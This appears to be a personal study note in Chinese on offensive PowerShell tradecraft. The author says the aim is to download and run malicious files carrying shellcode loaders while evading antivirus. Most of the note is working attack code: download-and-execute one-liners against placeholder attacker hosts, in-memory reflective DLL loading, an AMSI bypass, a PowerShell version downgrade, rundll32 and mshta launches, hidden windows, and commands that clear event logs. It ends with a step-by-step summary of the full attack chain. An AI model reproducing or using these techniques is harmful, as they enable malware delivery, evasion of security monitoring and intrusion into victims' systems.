### 常见的powershell功能脚本
我的主要目的就是利用powershell脚本去下载并且执行恶意文件，而恶意文件中含有shellcode加载器，我会对加载器进行免杀处理，这样即可。

### PS脚本下载恶意文件
##### Invoke-WebRequest命令
```
Invoke-WebRequest -Uri "http://maliciousurl.com/malware.exe" -OutFile "C:\Temp\malware.exe"
Start-Process "C:\Temp\malware.exe"
```
通过 `Invoke-WebRequest` 从远程服务器下载恶意可执行文件，然后通过 `Start-Process` 启动它。

- 需要管理员权限才能执行一些下载操作到系统目录或者启动程序。
- 如果用户权限较低，可能无法下载到受保护的目录（如 `C:\Program Files`），但可以选择其他位置。

##### Invoke-Expression (IEX)命令
```
IEX (New-Object Net.WebClient).DownloadString('http://maliciousurl.com/malicious.ps1')
```
使用 `Invoke-Expression (IEX)` 来执行远程脚本。`DownloadString` 会从指定的 URL 下载并执行 PowerShell 脚本，通常用来执行远程控制命令。

- 默认的执行策略可能会阻止执行远程脚本。需要调整执行策略（如 `Set-ExecutionPolicy`）以允许脚本执行。
- 如果 PowerShell 脚本有数字签名且执行策略要求签名，未签名的脚本将无法执行

##### 利用 WMI 执行远程命令
```
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c start C:\Temp\malware.exe"
```
通过 Windows Management Instrumentation (WMI) 远程启动恶意程序。适用于绕过防火墙和其他防御机制，且常用于横向传播。

- 需要管理员权限，WMI 需要相应权限才能执行远程操作。
- 如果 WMI 被监控或受限制，攻击可能会失败。

##### System.Net.WebClient类
`WebClient` 是 .NET 框架中的类，用于在网络上进行数据传输。`WebClient` 提供了简便的方法来执行常见的网络操作，例如上传或下载文件。
```
$client = New-Object System.Net.WebClient
$client.DownloadFile("https://example.com/file.zip", "C:\path\to\file.zip")
```
`WebClient` 类的 `DownloadFile` 方法会直接从指定的 URL 下载文件，并将其保存到本地文件系统。与 `Invoke-WebRequest` 类似，但语法更加简洁，适合用于下载文件。

##### System.Net.Http.HttpClient类
`HttpClient` 是 .NET Framework 中的一个类，提供了更强大的 HTTP 请求处理功能，适用于需要更复杂的 HTTP 操作的场景。
```
$client = New-Object System.Net.Http.HttpClient
$response = $client.GetAsync("https://example.com/file.zip").Result
$content = $response.Content.ReadAsByteArrayAsync().Result
[System.IO.File]::WriteAllBytes("C:\path\to\file.zip", $content)

```
`HttpClient` 提供了更多的灵活性和控制，特别适合需要处理异步请求、大文件下载和复杂的请求头、认证等操作。通过 `GetAsync` 获取响应内容，然后通过字节数组保存文件。

##### Start-BitsTransfer类
`Start-BitsTransfer` 是 PowerShell 中的一种命令，通常用于将文件从本地系统传输到远程系统或从远程系统下载文件。它是利用后台智能传输服务（BITS）来传输文件。
```
Start-BitsTransfer -Source "https://example.com/file.zip" -Destination "C:\path\to\file.zip"

```
`Start-BitsTransfer` 会使用 BITS（Background Intelligent Transfer Service）进行文件传输，适合于需要下载大文件并且能够容忍传输在后台进行的情况。它特别适用于通过较慢或不稳定的网络进行文件下载，因为它支持断点续传。

##### Invoke-RestMethod函数
`Invoke-RestMethod` 是 PowerShell 中的一个 cmdlet，用于处理 HTTP 请求，尤其是 RESTful API 请求。它通常用于获取 JSON 数据或其他格式的响应，并将其自动转换为 PowerShell
```
Invoke-RestMethod -Uri "https://example.com/file.zip" -OutFile "C:\path\to\file.zip"

```
`Invoke-RestMethod` 实际上与 `Invoke-WebRequest` 类似，但专注于与 REST API 的交互。它也可以用来下载文件，尤其是在涉及 API 调用或 JSON 数据时。

### PS脚本加载恶意文件
##### 通过 `System.IO.FileInfo` 动态加载脚本
`System.IO.FileInfo` 类用于获取文件的详细信息，并可以通过 PowerShell 加载并执行文件。攻击者可以利用它来将恶意脚本读取到内存中并执行。
```
$filePath = "C:\path\to\malicious.ps1"
$fileContent = [System.IO.File]::ReadAllText($filePath)
Invoke-Expression $fileContent
```
- **绕过检测**：这项技术允许将脚本内容动态加载并执行，而不是通过常规的文件操作（如 `Get-Content`）。它可以在不留下痕迹的情况下加载恶意代码，减少 AV 检测的可能性。
    
- **攻击场景**：在渗透测试或红队攻击中，攻击者可以通过这种方法加载本地恶意脚本并在内存中执行，而不依赖文件系统。

###### 通过 PowerShell `MemoryStream` 执行恶意文件
`MemoryStream` 类使 PowerShell 脚本能够从内存中加载和执行数据，而不需要将文件写入磁盘。恶意脚本或二进制文件可以被加载到内存中并执行，而不会在磁盘上留下痕迹。
```
$bytes = [Convert]::FromBase64String('Base64-encoded-malicious-script')
$ms = New-Object System.IO.MemoryStream($bytes)
$reader = New-Object System.IO.StreamReader($ms)
$script = $reader.ReadToEnd()
Invoke-Expression $script
```
- **绕过检测**：通过 Base64 编码将恶意代码嵌入脚本，并通过 `MemoryStream` 在内存中执行。此方法避免了磁盘文件的创建，可以成功绕过基于文件的检测。
    
- **攻击场景**：此技术可用于将恶意脚本或二进制代码通过网络载入并在内存中执行，避免留下文件痕迹，适用于较为复杂的红队渗透测试。

###### 利用mshta，rundll.32等白名单合法程序加载恶意文件（白+黑手法）


### PS脚本的执行的规避，藏匿
##### 规避，藏匿原则
让下载，加载过程后台化，内存化，模仿合法应用执行，混淆化

##### 常用规避AV软件的方法
###### 采用正规合法的下载源地址
采用云盘，云储存空间，托管平台作为下载源，将恶意的代码托管网站变成可信网站（域名，证书等方法和建立和信任的钓鱼网站方法相同）

###### Base64 编码
```
powershell.exe -enc JABJAFgAIAA9ACAATgBlAHcALQBPA...（省略）
```
- `-enc` 选项让 PowerShell 执行 Base64 编码的命令
- 避免直接暴露恶意 URL 或 `Invoke-Expression`

###### 字符串拼接 & 混淆
PowerShell 允许使用 `-join`、`replace`、字符串拼接等方法隐藏关键字。
```
$p='In'+'voke-Ex'+'pression'
$p(New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1')
```
- AV 主要基于字符串匹配，如果直接匹配 `Invoke-Expression`，可能会被拦截
- 但如果分割关键字符串，AV 很难检测

###### AMSI Bypass（绕过 Windows 反恶意软件扫描接口）
Windows 10+ 版本内置 **AMSI（Antimalware Scan Interface）**，可检测 PowerShell 脚本中的恶意内容。
```
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
- Windows 在 PowerShell 运行时，会调用 `AmsiScanBuffer()` 进行 AV 扫描
- 通过 `SetValue()` 修改 `amsiInitFailed`，让 AMSI 失效

###### 强制回退Powershell版本
Windows 10 默认使用 **PowerShell 5+**，具备 AMSI 和安全日志。但旧版本（PowerShell 2.0）没有这些安全功能。  
攻击者可以**强制让 PowerShell 退回到 2.0**，绕过安全检测。
```
powershell.exe -Version 2 -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1')"
```
- PowerShell 2.0 **没有 AMSI 和日志记录**
- 许多 AV 主要检测 PowerShell 5+ 版本，较少关注旧版本

###### 使用合法进程（LOLBins）执行 PowerShell 
攻击者可以使用 Windows **合法进程（Living Off The Land Binaries，LOLBins）** 执行 PowerShell，隐藏恶意行为。
```
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";document.write();GetObject("script:powershell.exe -enc ...").Run()
```
使用rundll32运行ps脚本

```
mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""powershell.exe -enc ..."" ")
```
使用mshta运行ps脚本

- `rundll32.exe` 和 `mshta.exe` 是 Windows 白名单进程，不易触发 AV
- 可通过 `javascript:` 或 `vbscript:` 方式执行 PowerShell

###### 落地内存
1---使用 `Invoke-Expression` (或别名 `iex`) 执行脚本
`Invoke-Expression` 是 PowerShell 的一个内建 cmdlet，用于在运行时执行动态生成的代码。通过将 PowerShell 脚本内容作为字符串传递给它，可以让代码在内存中执行而不写入磁盘。
```
$encodedScript = "base64-encoded-script-here"
$decodedScript = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($encodedScript))
Invoke-Expression $decodedScript
```
- 在这个示例中，脚本首先以 Base64 编码的形式存储。然后，脚本内容被解码并通过 `Invoke-Expression` 在内存中执行。
- 防病毒软件很难检测到 Base64 编码的内容，因为它没有在磁盘上留下明显的脚本文件，且在解码后执行的内容直接在内存中处理。

2---使用 `IEX` 与远程脚本执行
`IEX`（`Invoke-Expression` 的别名）可以用来直接执行远程下载的脚本内容，这样无需将脚本文件存储到本地磁盘。
```
IEX (New-Object Net.WebClient).DownloadString('http://example.com/malicious.ps1')
```
- 通过 `New-Object Net.WebClient` 下载远程脚本内容，并通过 `IEX` 执行脚本。这种方法通常用于从远程服务器加载并在内存中执行脚本。
- 如果 URL 被配置为受信任，AV 软件可能不会检查或拦截这种行为，尤其是如果脚本下载和执行的过程是快速且不留痕迹的。

3---利用mshta等类似合法进程去执行

##### 常用藏匿方法
###### 隐藏 PowerShell 窗口
默认情况下，PowerShell 执行时会打开一个窗口，用户可能会注意到。可以使用以下参数隐藏窗口：
```
powershell -WindowStyle Hidden -NoProfile -NonInteractive -ExecutionPolicy Bypass -File script.ps1
```
- `-WindowStyle Hidden`：隐藏 PowerShell 窗口
- `-NoProfile`：避免加载用户 PowerShell 配置，提高执行速度
- `-NonInteractive`：不显示交互式输入
- `-ExecutionPolicy Bypass`：绕过执行策略（==十分重要==）
这个方法适用于 **直接执行的 PowerShell**，但进程仍然可见。

###### 让 PowerShell 运行在后台，不创建powershell.exe进程 
使用 `WMI` 创建进程，让 PowerShell 进程 **不显示在任务栏**：
```
wmic process call create "powershell.exe -w hidden -noni -nop -enc ..."
```
`wmic process call create` 方式创建的进程不会直接弹出窗口，且可以伪装成 **WMI 任务**，避免用户注意到。

###### 通过 `mshta.exe` 执行 PowerShell
```
mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""powershell.exe -w hidden -enc ..."", 0")
```
- `mshta.exe` 是 Windows 自带的合法进程，通常不会被 AV 拦截。
- 通过 `WScript.Shell` 运行 PowerShell，且 `, 0` 让进程 **完全隐藏**。
- **用户不会看到任何窗口，也不会发现 `powershell.exe` 直接运行！**

###### 通过 `rundll32.exe` 执行 PowerShell
```
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";document.write();GetObject("script:powershell.exe -w hidden -enc ...").Run()
```
- `rundll32.exe` 是 Windows 自带的合法进程，通常不会被 AV 直接拦截。
- 通过 `mshtml`（IE 组件）执行 JavaScript，进而调用 PowerShell，**避免 `powershell.exe` 直接出现在任务管理器中**。
- **适用于 Windows 7 / 10 默认配置，不需要额外权限**。

###### 通过 Office COM 对象执行 PowerShell
```
$excel = New-Object -ComObject Excel.Application
$excel.Visible = $false
$excel.ExecuteExcel4Macro("CALL(""powershell.exe -w hidden -enc ..."")")
```
- 通过 **Excel COM 对象** 执行 PowerShell，隐藏 `powershell.exe` 进程。
- Excel 进程是合法的，即使用户查看任务管理器，也不会发现异常。

###### 禁用 PowerShell 事件日志
```
wevtutil cl "Microsoft-Windows-PowerShell/Operational"
```
`wevtutil` 是 Windows 内置命令，可清除指定的事件日志。

###### 使用 `System.Diagnostics.Eventing.Reader` 直接删除日志
```
$log = New-Object System.Diagnostics.Eventing.Reader.EventLogSession
$log.ClearLog("Microsoft-Windows-PowerShell/Operational")
```
直接删除 PowerShell 相关日志，避免管理员发现 PowerShell 执行痕迹。


### PS脚本中自己常用必会手法
#### 利用合法程序下载，加载，执行恶意文件
##### 利用rundll.32加载，规避
```powershell
# 目标URL（需替换为实际的恶意或测试URL）
$downloadUrl = "http://example.com/payload.dll"

# 目标进程 rundll32.exe
$rundll32 = "$env:SystemRoot\System32\rundll32.exe"

# 在内存中下载文件并加载，不落地磁盘
$wc = New-Object System.Net.WebClient
$bytes = $wc.DownloadData($downloadUrl)  # 直接下载文件数据到内存
$memStream = New-Object System.IO.MemoryStream(,$bytes)  # 将数据存入内存流

# 通过反射加载DLL
$assembly = [System.Reflection.Assembly]::Load($memStream)

# 查找并执行恶意DLL的导出函数
$entryPoint = $assembly.EntryPoint
$entryPoint.Invoke($null, @())

# 通过 rundll32.exe 执行
Start-Process -FilePath $rundll32 -ArgumentList "C:\Windows\System32\shell32.dll,Control_RunDLL" -NoNewWindow
```

###### 代码详细解释
**1. `$downloadUrl = "http://example.com/payload.dll"`**
- 这里定义了要下载的恶意文件的 URL，需要替换为实际的 URL。
 **2. `$rundll32 = "$env:SystemRoot\System32\rundll32.exe"`**
- `rundll32.exe` 是 Windows 的合法系统进程，可用于调用 DLL 文件的导出函数。
- `$env:SystemRoot` 获取系统目录（通常是 `C:\Windows`），然后拼接出 `rundll32.exe` 的完整路径。
 **3. `New-Object System.Net.WebClient`**
- 创建 `WebClient` 对象，用于进行 HTTP 请求。
 **4. `$bytes = $wc.DownloadData($downloadUrl)`**
- `DownloadData()` 方法用于直接下载目标文件，并存储在 `$bytes` 变量中。
- **这里避免了 `DownloadFile()` 方法，该方法会写入磁盘，容易被防病毒软件检测。**
 **5. `$memStream = New-Object System.IO.MemoryStream(,$bytes)`**
- **关键点：** 使用 `MemoryStream` 将下载的数据存入内存，而不是保存到磁盘。
- 这样可以**避免在文件系统中留下痕迹**，提高隐蔽性。
 **6. `$assembly = [System.Reflection.Assembly]::Load($memStream)`**
- `Assembly.Load()` 方法用于从内存加载 .NET DLL，不写入磁盘，绕过基于文件的防护机制。
- 这使得 PowerShell 可以直接加载和调用目标 DLL 文件，而不在磁盘上存储该文件。
 **7. `$entryPoint = $assembly.EntryPoint`**
- `EntryPoint` 获取 DLL 文件的主入口点，找到默认执行函数。
 **8. `$entryPoint.Invoke($null, @())`**
- 调用 DLL 入口点，执行恶意代码。
- 这是一种**无文件（fileless）执行方式**，大部分 AV 只检测磁盘文件，而不会检测此方法。
**9. `Start-Process -FilePath $rundll32 -ArgumentList  "C:\Windows\System32\shell32.dll,Control_RunDLL" -NoNewWindow`**
- 这里使用 `rundll32.exe` 执行 `shell32.dll`，模拟合法调用，以掩盖 PowerShell 进程的执行痕迹。
- `-NoNewWindow` 选项使得它不会弹出新的控制台窗口，避免被用户察觉。

###### rundll.32详解
`rundll32.exe` 是一个 Windows 系统中用于执行和加载 DLL 文件的工具，它主要用于在系统中调用并执行 DLL 文件中的函数。对于其他类型的文件，如 EXE 或 DAT 文件，`rundll32.exe` 并不直接支持加载和执行。同样也不可以执行下载命令和任务。
可以利用其他命令下载，再利用rundll加载恶意文件。

###### 区分dll文件和exe文件
dll文件不是直接可执行文件而是由一堆函数构成的文件，只是为文件的运行提供函数，并不是系统的可执行文件，所以利用ps脚本执行dll时需要先加载dll中的相关函数后，在利用rundll加载恶意的dll文件。

exe是系统直接可以执行的可执行文件可以利用特定的ps命令直接执行，而不需要再去单独加载。

##### 利用mshta下载，加载，规避
```powershell
# 指定下载文件的URL
$url = "http://example.com/malicious.dll"

# 下载文件到内存中
$wc = New-Object System.Net.WebClient
$fileData = $wc.DownloadData($url)

# 将文件数据加载到内存流
$memStream = New-Object System.IO.MemoryStream(,$fileData)

# 使用反射加载DLL
$assembly = [System.Reflection.Assembly]::Load($memStream.ToArray())

# 获取 DLL 中的入口点
$entryPoint = $assembly.EntryPoint

# 执行入口点中的方法（即恶意代码）
$entryPoint.Invoke($null, @())

# 使用 mshta 执行内存中的脚本
mshta "javascript:eval('var blob = new Blob([\"' + [System.Convert]::ToBase64String($fileData) + '\"]);var url = URL.createObjectURL(blob);window.location.href=url;')"
```
![[Pasted image 20250218155744.png]]
![[Pasted image 20250218155803.png]]
![[Pasted image 20250218155837.png]]
使用mshta执行内存中的文件
```powershell
mshta "javascript:eval('var blob = new Blob([\"' + [System.Convert]::ToBase64String($fileData) + '\"]);var url = URL.createObjectURL(blob);window.location.href=url;')"
```
![[Pasted image 20250218155937.png]]

###### 利用mshta加载dll或者exe
`mshta.exe` 是一个合法的 Windows 进程，用于执行 HTML 应用程序（HTA 文件）。它**并不能直接执行 EXE 文件**，但是可以运行 **JavaScript** 和 **VBScript**，并通过这些脚本间接执行恶意代码。由于 `mshta.exe` 主要设计为执行 HTML 或脚本内容，而不是直接执行二进制文件（如 EXE 文件），它不适合直接运行 EXE 文件。

然而，我们仍然可以利用 `mshta.exe` 作为一个“容器”来运行内存中的脚本，通过间接方式执行恶意 EXE 文件或 DLL 文件。为了实现这种目的，<mark style="background: #FF5582A6;">通常是通过将 EXE 文件作为 Base64 编码的数据传递到脚本中，在内存中执行。</mark>

```powershell
# 指定恶意 EXE 文件的 URL
$url = "http://example.com/malicious.exe"

# 下载 EXE 文件到内存中
$wc = New-Object System.Net.WebClient
$exeData = $wc.DownloadData($url)

# 将 EXE 数据编码为 Base64
$base64Exe = [Convert]::ToBase64String($exeData)

# 使用 mshta 执行 Base64 编码的 EXE 文件（通过 JavaScript 解码并执行）
mshta "javascript:
    var encodedData = '$base64Exe';
    var byteArray = new Uint8Array(atob(encodedData).split('').map(function(c) { return c.charCodeAt(0) }));
    var blob = new Blob([byteArray]);
    var url = URL.createObjectURL(blob);
    var link = document.createElement('a');
    link.href = url;
    link.download = 'malicious.exe';
    link.click();"
```


#### 下载命令
##### Invoke-WebRequest命令
```powershell
Invoke-WebRequest -Uri "http://maliciousurl.com/malware.exe" -OutFile "C:\Temp\malware.exe"
Start-Process "C:\Temp\malware.exe"
```
通过 `Invoke-WebRequest` 从远程服务器下载恶意可执行文件，然后通过 `Start-Process` 启动它。

- 需要管理员权限才能执行一些下载操作到系统目录或者启动程序。
- 如果用户权限较低，可能无法下载到受保护的目录（如 `C:\Program Files`），但可以选择其他位置。

###### Start-BitsTransfer类
```powershell
Start-BitsTransfer -Source "https://example.com/file.zip" -Destination "C:\path\to\file.zip"
```
`Start-BitsTransfer` 会使用 BITS（Background Intelligent Transfer Service）进行文件传输，适合于需要下载大文件并且能够容忍传输在后台进行的情况。它特别适用于通过较慢或不稳定的网络进行文件下载，因为它支持断点续传。


#### 规避方法
##### 编码，混淆，拼接，加密
编码，混淆，拼接一般是必备的，主要对恶意链接，重要被检测的恶意命令进行上述操作
##### 落地内存
文件落地内存，文件数据落地内存，根据需要选择好是否需要落地
一般情况下除非利用计划任务去执行或者权限维持，或者是诱饵文件不然都选择落地内存
##### 绕过ASMI
使用的少
##### 无进程，无窗口，无显示，后台运行，绕过执行策略，不使用用户配置

##### 禁用ps事件日志

#### 总结PS脚本执行流程
1---利用下载命令下载恶意代码
2---将下载的恶意文件下载至内存中
3---将恶意文件的执行数据加载到内存流中
4---加载执行恶意文件（利用合法进程，rundll，mshta，cmd）
如果是dll文件先加载后执行
如果是exe文件就是先编码在执行
5---无窗口，无显示，绕过执行策略，禁用ps事件日志

#### 常用的PS恶意脚本编写的工具

#### 重要的APT真实攻击学习
该笔记中一般只展示利用PS脚本下载，执行恶意文件的记录文章，由于自己的攻击思路就是利用ps脚本(lnk加载脚本)

1---
```cardlink
url: https://www.ctfiot.com/151646.html
title: "疑似Kasablanka组织针对纳卡地区的攻击活动分析 | CTF导航"
description: "Kasablanka（卡萨布兰卡）是由思科命名的一个APT组织，攻击对象主要集中在中东、中亚以及东欧等地区。该组织开发出了LodaRAT等木马，并同时拥有Windows和Android双平台攻击能力。近期，360高级威胁研究院发现疑似..."
host: www.ctfiot.com
image: https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/5-1702741693.jpeg
```

2---
```cardlink
url: https://www.ctfiot.com/148469.html
title: "威胁情报 | 海莲花 APT 组织模仿 APT29 攻击活动分析 | CTF导航"
description: "作者：知道创宇404高级威胁情报团队时间：2023年11月30日1. 概述参考资料2023年11月，知道创宇404高级威胁情报团队成功捕获到海莲花组织最新的攻击样本。该样本以购买BMW汽车为主题，诱导攻击目标执行恶意文..."
host: www.ctfiot.com
image: https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/11/2-1701349434.jpeg
```



